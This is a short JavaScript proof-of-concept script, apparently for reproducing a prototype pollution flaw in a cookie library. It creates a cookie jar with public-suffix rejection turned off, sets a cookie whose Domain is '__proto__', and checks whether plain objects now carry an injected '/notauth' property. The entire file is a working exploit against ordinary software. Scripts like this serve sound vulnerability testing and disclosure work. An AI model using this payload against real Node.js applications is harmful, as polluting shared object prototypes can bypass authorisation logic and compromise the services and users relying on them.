
async function main() {
  const tough = require('./lib/cookie');

  // Create a cookie jar without rejecting public suffixes
  const cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

  try {
    // Attempt to exploit prototype pollution
    await new Promise((resolve, reject) => {
      cookiejar.setCookie(
        'Slonser=polluted; Domain=__proto__; Path=/notauth',
        'https://__proto__/admin',
        (err, cookie) => {
          if (err) {
            console.error("Error setting exploit cookie:", err);
            reject(err);
          } else {
            console.log("Exploit cookie set successfully:", cookie.toString());
            resolve(cookie);
          }
        }
      );
    });

    // Check for prototype pollution
    const testObject = {};
    if (testObject['/notauth']?.['Slonser']) {
      console.log('EXPLOITED SUCCESSFULLY');
    } else {
      console.log('EXPLOIT FAILED');
    }
  } catch (err) {
    console.log('EXPLOIT FAILED: Error encountered during exploitation');
  }
}
  
  main();
  